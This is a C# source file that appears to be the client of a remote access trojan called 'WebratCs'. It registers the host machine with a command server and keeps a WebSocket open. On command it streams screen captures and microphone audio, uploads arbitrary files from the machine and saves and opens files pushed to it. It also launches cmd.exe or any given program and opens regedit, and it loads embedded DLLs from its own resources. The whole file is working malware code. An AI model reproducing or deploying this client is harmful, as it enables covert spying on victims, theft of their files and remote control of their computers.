using System;
using System.Net.WebSockets;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Reflection;
using System.Windows.Forms;
using WebratCs.Common;
using WebratCs.Desktop;
using WebratCs.Microphone;
using WebratCs.Camera;
using WebratCs.Sendfile;
using WebratCs.BuildConf;

namespace WebratCs.Client
{
    class Program
    {
        static void Main(string[] args)
        {
            InitDeps();
            MainAsync(args).Wait();
        }
        static async Task MainAsync(string[] args)
        {
            string apiBase = Environment.GetEnvironmentVariable("API_BASE_URL");
            if (string.IsNullOrEmpty(apiBase)) apiBase = BuildDefaults.API_BASE_URL ?? "http://localhost:8080";
            string secret = StreamSecret();
            var device = await EnsureDevice(apiBase);
            await SetStatus(apiBase, device.id, "online");
            using (var ws = new ClientWebSocket())
            {
                ws.Options.KeepAliveInterval = TimeSpan.FromSeconds(15);
                var uri = new Uri(WsUrl(apiBase, "/ws/device"));
                await ws.ConnectAsync(uri, CancellationToken.None);
                var hello = string.Format("{{\"type\":\"hello\",\"deviceId\":\"{0}\",\"secret\":\"{1}\"}}", device.id, secret);
                await SendText(ws, hello);
                var pollTask = Task.Run(async () => await PollTasks(apiBase, device.id));
                var hbTask = Task.Run(async () =>
                {
                    while (true)
                    {
                        try { await Heartbeat(apiBase, device.id); } catch {}
                        await Task.Delay(30000);
                    }
                });

                bool useEnc = string.Equals(Environment.GetEnvironmentVariable("STREAM_ENCRYPT") ?? "", "1", StringComparison.OrdinalIgnoreCase)
                    || string.Equals(Environment.GetEnvironmentVariable("STREAM_ENCRYPT") ?? "", "true", StringComparison.OrdinalIgnoreCase);
                bool screenEnabled = true;
                bool micEnabled = false;
                int displayIndex = 0;
                int fps = GetEnvInt("STREAM_FPS", 5);
                int q = GetEnvInt("STREAM_JPEG_QUALITY", 75);
                int w = GetEnvInt("STREAM_WIDTH", 0);
                int h = GetEnvInt("STREAM_HEIGHT", 0);
                
                string selectedMic = Environment.GetEnvironmentVariable("STREAM_MIC_NAME");
                int audioRateCfg = GetEnvInt("STREAM_AUDIO_RATE", 48000);
                int audioChannelsCfg = GetEnvInt("STREAM_AUDIO_CHANNELS", 1);
                int audioChunkMsCfg = GetEnvInt("STREAM_AUDIO_CHUNK_MS", 20);
                WaveInMic mic = null;

                var recvTask = Task.Run(async () =>
                {
                    var buf = new byte[65536];
                    var ms = new System.IO.MemoryStream();
                    while (true)
                    {
                        var r = await ws.ReceiveAsync(new ArraySegment<byte>(buf), CancellationToken.None);
                        if (r.MessageType == WebSocketMessageType.Close) break;
                        if (r.Count > 0) ms.Write(buf, 0, r.Count);
                        if (r.EndOfMessage)
                        {
                            var text = Encoding.UTF8.GetString(ms.ToArray());
                            ms.SetLength(0);
                            var t = ExtractJson(text, "type");
                            if (string.Equals(t, "file_open", StringComparison.OrdinalIgnoreCase))
                            {
                                var fn = ExtractJson(text, "filename");
                                var b64 = ExtractJson(text, "b64");
                                if (!string.IsNullOrEmpty(b64))
                                {
                                    var data = Convert.FromBase64String(b64);
                                    SendFileUtil.SaveAndOpen(data, fn);
                                }
                                else
                                {
                                    var iv = Convert.FromBase64String(ExtractJson(text, "iv"));
                                    var tag = Convert.FromBase64String(ExtractJson(text, "tag"));
                                    var ct = Convert.FromBase64String(ExtractJson(text, "ciphertext"));
                                    SendFileUtil.SaveAndOpenEncrypted(iv, tag, ct, secret, fn);
                                }
                            }
                            else if (string.Equals(t, "open_path", StringComparison.OrdinalIgnoreCase))
                            {
                                var p = ExtractJson(text, "path");
                                if (!string.IsNullOrEmpty(p))
                                {
                                    try { SendFileUtil.OpenLocalFile(p); } catch {}
                                }
                            }
                            else if (string.Equals(t, "file_upload", StringComparison.OrdinalIgnoreCase))
                            {
                                var p = ExtractJson(text, "path");
                                var n = System.IO.Path.GetFileName(p);
                                await SendFileUtil.UploadFileWS(ws, secret, n, p, GetEnvInt("FILE_SEND_CHUNK", 65536));
                            }
                            else if (string.Equals(t, "open_explorer", StringComparison.OrdinalIgnoreCase))
                            {
                                var p = ExtractJson(text, "path");
                                if (string.IsNullOrEmpty(p)) p = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                                try { SendFileUtil.OpenLocalFile(p); } catch {}
                            }
                            else if (string.Equals(t, "open_shell", StringComparison.OrdinalIgnoreCase))
                            {
                                var cmd = ExtractJson(text, "cmd");
                                if (string.IsNullOrEmpty(cmd)) cmd = "cmd.exe";
                                try
                                {
                                    var psi = new System.Diagnostics.ProcessStartInfo(cmd);
                                    psi.UseShellExecute = true;
                                    System.Diagnostics.Process.Start(psi);
                                }
                                catch { }
                            }
                            else if (string.Equals(t, "open_regedit", StringComparison.OrdinalIgnoreCase))
                            {
                                try
                                {
                                    var psi = new System.Diagnostics.ProcessStartInfo("regedit.exe");
                                    psi.UseShellExecute = true;
                                    System.Diagnostics.Process.Start(psi);
                                }
                                catch { }
                            }
                            else if (string.Equals(t, "start_stream", StringComparison.OrdinalIgnoreCase))
                            {
                                var source = ExtractJson(text, "source");
                                if (string.Equals(source, "screen", StringComparison.OrdinalIgnoreCase))
                                {
                                    int di;
                                    if (int.TryParse(ExtractJson(text, "display"), out di)) displayIndex = Math.Max(0, di);
                                    int tfps; if (int.TryParse(ExtractJson(text, "fps"), out tfps) && tfps > 0) fps = tfps;
                                    int tq; if (int.TryParse(ExtractJson(text, "jpegQuality"), out tq) && tq > 0) q = tq;
                                    int tw; if (int.TryParse(ExtractJson(text, "width"), out tw) && tw > 0) w = tw;
                                    int th; if (int.TryParse(ExtractJson(text, "height"), out th) && th > 0) h = th;
                                    screenEnabled = true; micEnabled = false;
                                }
                                
                                else if (string.Equals(source, "mic", StringComparison.OrdinalIgnoreCase))
                                {
                                    var name = ExtractJson(text, "mic");
                                    if (!string.IsNullOrEmpty(name)) selectedMic = name;
                                    int ar; if (int.TryParse(ExtractJson(text, "audioRate"), out ar) && ar > 0) audioRateCfg = ar;
                                    int ach; if (int.TryParse(ExtractJson(text, "audioChannels"), out ach) && (ach == 1 || ach == 2)) audioChannelsCfg = ach;
                                    int ams; if (int.TryParse(ExtractJson(text, "audioChunkMs"), out ams) && ams > 0) audioChunkMsCfg = ams;
                                    micEnabled = true; screenEnabled = false;
                                    try { if (mic != null) { mic.Dispose(); mic = null; } } catch {}
                                    try
                                    {
                                        var m = new WaveInMic();
                                        m.OnChunk += async delegate(byte[] payload)
                                        {
                                            if (!micEnabled) return;
                                            if (useEnc)
                                            {
                                                var enc = Crypto.EncryptAesGcm(payload, secret);
                                                var ctB64 = Convert.ToBase64String(enc.Ciphertext);
                                                var ivB64 = Convert.ToBase64String(enc.Iv);
                                                var tagB64 = Convert.ToBase64String(enc.Tag);
                                                var msg = "{\"type\":\"audio\",\"ciphertext\":\"" + ctB64 + "\",\"iv\":\"" + ivB64 + "\",\"tag\":\"" + tagB64 + "\",\"sampleRate\":" + audioRateCfg + ",\"channels\":" + audioChannelsCfg + ",\"ts\":\"" + DateTime.UtcNow.ToString("O") + "\"}";
                                                await SendText(ws, msg);
                                            }
                                            else
                                            {
                                                var b64 = Convert.ToBase64String(payload);
                                                var msg = "{\"type\":\"audio\",\"b64\":\"" + b64 + "\",\"sampleRate\":" + audioRateCfg + ",\"channels\":" + audioChannelsCfg + ",\"ts\":\"" + DateTime.UtcNow.ToString("O") + "\"}";
                                                await SendText(ws, msg);
                                            }
                                        };
                                        if (m.Start(audioRateCfg, audioChannelsCfg, audioChunkMsCfg, selectedMic))
                                        {
                                            mic = m;
                                        }
                                    }
                                    catch { }
                                }
                            }
                            else if (string.Equals(t, "stop_stream", StringComparison.OrdinalIgnoreCase))
                            {
                                screenEnabled = false; micEnabled = false;
                                try { if (mic != null) { mic.Dispose(); mic = null; } } catch {}
                            }
                        }
                    }
                });

                var desktopTask = Task.Run(async () =>
                {
                    var interval = TimeSpan.FromMilliseconds(Math.Max(100, 1000 / Math.Max(1, fps)));
                    int dynQ = Math.Max(40, Math.Min(q, 90));
                    while (true)
                    {
                        var start = DateTime.UtcNow;
                        if (screenEnabled)
                        {
                            var img = DesktopCapture.CaptureDisplayJpegScaled(displayIndex, dynQ, w, h);
                            string msg;
                            if (useEnc)
                            {
                                var enc = Crypto.EncryptAesGcm(img, secret);
                                var ctB64 = Convert.ToBase64String(enc.Ciphertext);
                                var ivB64 = Convert.ToBase64String(enc.Iv);
                                var tagB64 = Convert.ToBase64String(enc.Tag);
                                msg = "{\"type\":\"frame\",\"ciphertext\":\"" + ctB64 + "\",\"iv\":\"" + ivB64 + "\",\"tag\":\"" + tagB64 + "\",\"format\":\"jpeg\",\"ts\":\"" + DateTime.UtcNow.ToString("O") + "\"}";
                            }
                            else
                            {
                                var b64 = Convert.ToBase64String(img);
                                msg = "{\"type\":\"frame\",\"b64\":\"" + b64 + "\",\"format\":\"jpeg\",\"ts\":\"" + DateTime.UtcNow.ToString("O") + "\"}";
                            }
                            await SendText(ws, msg);
                        }
                        var elapsed = DateTime.UtcNow - start;
                        if (elapsed > TimeSpan.FromMilliseconds(interval.TotalMilliseconds * 0.8) && dynQ > 40) dynQ -= 5;
                        else if (elapsed < TimeSpan.FromMilliseconds(interval.TotalMilliseconds / 3) && dynQ < 90) dynQ += 3;
                        var sleep = interval - (DateTime.UtcNow - start);
                        if (sleep < TimeSpan.FromMilliseconds(1)) sleep = TimeSpan.FromMilliseconds(1);
                        await Task.Delay(sleep);
                    }
                });


                await Task.WhenAll(desktopTask, recvTask);
            }
        }

        static async Task PollTasks(string apiBase, string deviceId)
        {
            var client = new HttpClient();
            while (true)
            {
                try
                {
                    var resp = await client.GetAsync(apiBase.TrimEnd('/') + "/api/devices/" + deviceId + "/tasks");
                    var text = await resp.Content.ReadAsStringAsync();
                    int pos = text.IndexOf("\"type\":\"list_sources\"", StringComparison.OrdinalIgnoreCase);
                    while (pos >= 0)
                    {
                        int objStart = text.LastIndexOf("{", pos);
                        int objEnd = text.IndexOf("}", pos);
                        if (objStart >= 0 && objEnd > objStart)
                        {
                            var obj = text.Substring(objStart, objEnd - objStart + 1);
                            var status = ExtractJson(obj, "status");
                            if (string.Equals(status, "queued", StringComparison.OrdinalIgnoreCase))
                            {
                                var taskId = ExtractJson(obj, "id");
                                await UpdateTask(apiBase, taskId, "running", null);
                                var result = BuildSourcesResult();
                                await UpdateTask(apiBase, taskId, "done", result);
                            }
                        }
                        pos = text.IndexOf("\"type\":\"list_sources\"", objEnd + 1, StringComparison.OrdinalIgnoreCase);
                    }
                }
                catch { }
                await Task.Delay(1000);
            }
        }

        static async Task UpdateTask(string apiBase, string id, string status, string resultJsonOrNull)
        {
            var client = new HttpClient();
            var body = "{\"status\":\"" + status + "\"";
            if (!string.IsNullOrEmpty(resultJsonOrNull)) body += ",\"result\":" + resultJsonOrNull;
            body += "}";
            var req = new HttpRequestMessage(new HttpMethod("PATCH"), apiBase.TrimEnd('/') + "/api/tasks/" + id);
            req.Content = new StringContent(body, Encoding.UTF8, "application/json");
            await client.SendAsync(req);
        }

        static string EscapeJson(string s)
        {
            if (string.IsNullOrEmpty(s)) return "";
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"");
        }

        static string BuildSourcesResult()
        {
            var displays = Screen.AllScreens;
            var cams = AvicapCamera.ListDevices();
            var mics = WaveInMic.ListDevices();
            var sb = new StringBuilder();
            sb.Append("{\"displays\":[");
            for (int i = 0; i < displays.Length; i++)
            {
                var nm = "экран " + i;
                sb.Append("{\"index\":" + i + ",\"name\":\"" + EscapeJson(nm) + "\"}");
                if (i < displays.Length - 1) sb.Append(",");
            }
            sb.Append("],\"cameras\":[");
            for (int i = 0; i < cams.Length; i++)
            {
                sb.Append("\"" + EscapeJson(cams[i]) + "\"");
                if (i < cams.Length - 1) sb.Append(",");
            }
            sb.Append("],\"microphones\":[");
            for (int i = 0; i < mics.Length; i++)
            {
                sb.Append("\"" + EscapeJson(mics[i]) + "\"");
                if (i < mics.Length - 1) sb.Append(",");
            }
            sb.Append("]}");
            return sb.ToString();
        }

        static async Task SendText(ClientWebSocket ws, string text)
        {
            var buf = Encoding.UTF8.GetBytes(text);
            await ws.SendAsync(new ArraySegment<byte>(buf), WebSocketMessageType.Text, true, CancellationToken.None);
        }

        static string WsUrl(string apiBase, string path)
        {
            if (apiBase.StartsWith("https://")) return "wss://" + apiBase.Substring("https://".Length) + path;
            if (apiBase.StartsWith("http://")) return "ws://" + apiBase.Substring("http://".Length) + path;
            return "ws://" + apiBase.TrimEnd('/') + path;
        }

        static int GetEnvInt(string key, int def)
        {
            var v = Environment.GetEnvironmentVariable(key);
            int i;
            if (int.TryParse(v, out i) && i > 0) return i;
            return def;
        }

        class DeviceInfo { public string id; public string name; }
        static async Task<DeviceInfo> EnsureDevice(string apiBase)
        {
            var client = new HttpClient();
            var name = Environment.MachineName + "-cs";
            var body = new StringContent("{\"name\":\"" + name + "\"}", Encoding.UTF8, "application/json");
            var resp = await client.PostAsync(apiBase.TrimEnd('/') + "/api/devices/register", body);
            var text = await resp.Content.ReadAsStringAsync();
            var id = ExtractJson(text, "id");
            return new DeviceInfo { id = id, name = name };
        }

        static async Task SetStatus(string apiBase, string id, string status)
        {
            var client = new HttpClient();
            var body = new StringContent("{\"status\":\"" + status + "\"}", Encoding.UTF8, "application/json");
            await client.PostAsync(apiBase.TrimEnd('/') + "/api/devices/" + id + "/status", body);
        }
        static async Task Heartbeat(string apiBase, string id)
        {
            var client = new HttpClient();
            await client.PostAsync(apiBase.TrimEnd('/') + "/api/devices/" + id + "/heartbeat", new StringContent("{}", Encoding.UTF8, "application/json"));
        }

        static string ExtractJson(string json, string key)
        {
            var q = "\"" + key + "\"";
            var i = json.IndexOf(q, StringComparison.OrdinalIgnoreCase);
            if (i < 0) return "";
            i = json.IndexOf(':', i);
            if (i < 0) return "";
            while (i < json.Length && (json[i] == ':' || char.IsWhiteSpace(json[i]))) i++;
            if (i >= json.Length) return "";
            if (json[i] == '\"')
            {
                i++;
                int j = json.IndexOf('\"', i);
                if (j < 0) return "";
                return json.Substring(i, j - i);
            }
            else
            {
                int j = i;
                while (j < json.Length && json[j] != ',' && json[j] != '}' && !char.IsWhiteSpace(json[j])) j++;
                return json.Substring(i, j - i);
            }
        }

        static string StreamSecret()
        {
            var v = Environment.GetEnvironmentVariable("STREAM_SECRET");
            if (!string.IsNullOrEmpty(v)) return v;
            try
            {
                var proc = System.Diagnostics.Process.GetCurrentProcess();
                var mod = proc != null ? proc.MainModule : null;
                var exe = mod != null ? mod.FileName : null;
                if (!string.IsNullOrEmpty(exe))
                {
                    var dir = System.IO.Path.GetDirectoryName(exe);
                    var p1 = System.IO.Path.Combine(dir, ".env");
                    var p2 = System.IO.Path.Combine(dir, "..", ".env");
                    foreach (var p in new[] { ".env", p1, p2 })
                    {
                        if (System.IO.File.Exists(p))
                        {
                            foreach (var ln in System.IO.File.ReadAllLines(p))
                            {
                                var s = ln.Trim();
                                if (s.StartsWith("STREAM_SECRET=")) return s.Substring("STREAM_SECRET=".Length).Trim();
                            }
                        }
                    }
                }
            }
            catch { }
            var def = BuildDefaults.STREAM_SECRET;
            if (!string.IsNullOrEmpty(def)) return def;
            return "webrat-secret";
        }

        static void InitDeps()
        {
            AppDomain.CurrentDomain.AssemblyResolve += (s, e) =>
            {
                var dll = new AssemblyName(e.Name).Name + ".dll";
                var asm = LoadEmbeddedAssembly(dll);
                return asm;
            };
        }

        static Assembly LoadEmbeddedAssembly(string dllName)
        {
            var asm = Assembly.GetExecutingAssembly();
            var names = asm.GetManifestResourceNames();
            string found = null;
            foreach (var n in names)
            {
                if (n.EndsWith(dllName, StringComparison.OrdinalIgnoreCase))
                {
                    found = n;
                    break;
                }
            }
            if (found == null) return null;
            using (var s = asm.GetManifestResourceStream(found))
            {
                if (s == null) return null;
                var buf = new byte[s.Length];
                s.Read(buf, 0, buf.Length);
                return Assembly.Load(buf);
            }
        }
    }
}
